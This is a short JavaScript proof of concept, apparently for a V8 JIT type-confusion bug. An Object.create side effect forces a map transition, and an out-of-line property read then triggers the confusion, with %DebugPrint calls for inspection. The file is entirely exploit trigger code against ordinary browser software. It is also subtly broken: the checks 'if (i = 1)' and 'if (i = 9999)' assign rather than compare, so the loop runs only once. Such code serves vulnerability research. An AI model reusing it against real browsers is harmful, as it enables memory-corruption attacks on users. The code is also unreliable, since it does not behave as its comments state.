function vuln(obj) {
  // Access Property a of obj, forcing a CheckMap operation
  obj.a;

  // Force a Map Transition via our side-effect
  Object.create(obj)

  // Trigger our type-confusion by accessing an out-of-bound property
  return obj.b;
}

function trigger() {
  for (let i = 0; i < 10000; i++) {
    let obj = {a:42}; // Create object with in-line properties
    obj.b = 43; // Store property out-of-line in backing store
    if (i = 1) { %DebugPrint(obj); }
    vuln(obj); // Trigger type-confusion
    if (i = 9999) { %DebugPrint(obj); }
  }
}

trigger()